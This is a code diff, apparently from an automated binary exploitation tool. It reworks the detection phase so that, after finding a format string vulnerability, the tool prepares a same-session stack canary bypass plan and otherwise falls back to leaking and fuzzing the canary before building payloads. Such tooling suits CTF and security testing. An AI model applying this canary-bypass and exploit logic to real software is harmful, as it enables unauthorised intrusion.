@@ -103,19 +103,32 @@ def run_detect_phase(ctx: ExploitContext) -> None:
         )
         if probe.vulnerable:
             print_success("format string vulnerability detected")
-            print_info("attempting to leak canary value")
-            leaks = detect_canary.leakage_canary_value(ctx, program)
-            canary_info = detect_canary.canary_fuzz(
+            same_session_plan = detect_canary.discover_same_session_canary_plan(
                 ctx,
                 program,
                 ctx.binary.bit,
-                leaks,
-                max_seconds=ctx.canary_max_seconds,
             )
-            if canary_info is None:
-                print_warning("failed to leak canary value (will retry via candidates())")
+            if same_session_plan is not None:
+                print_success(
+                    "same-session canary plan prepared: "
+                    f"stack_index={same_session_plan.stack_index}, "
+                    f"buffer_to_canary={same_session_plan.buffer_to_canary}, "
+                    f"post_canary_padding={same_session_plan.post_canary_padding}"
+                )
             else:
-                print_success("canary value successfully leaked")
+                print_info("attempting to leak canary value")
+                leaks = detect_canary.leakage_canary_value(ctx, program)
+                canary_info = detect_canary.canary_fuzz(
+                    ctx,
+                    program,
+                    ctx.binary.bit,
+                    leaks,
+                    max_seconds=ctx.canary_max_seconds,
+                )
+                if canary_info is None:
+                    print_warning("failed to leak canary value (will retry via candidates())")
+                else:
+                    print_success("canary value successfully leaked")
             # v4.0.2c1: when fmtstr is detected, populate the
             # primitive's input fields so FmtstrX{32,64}LocalStrategy
             # can build_payload (was previously gated on
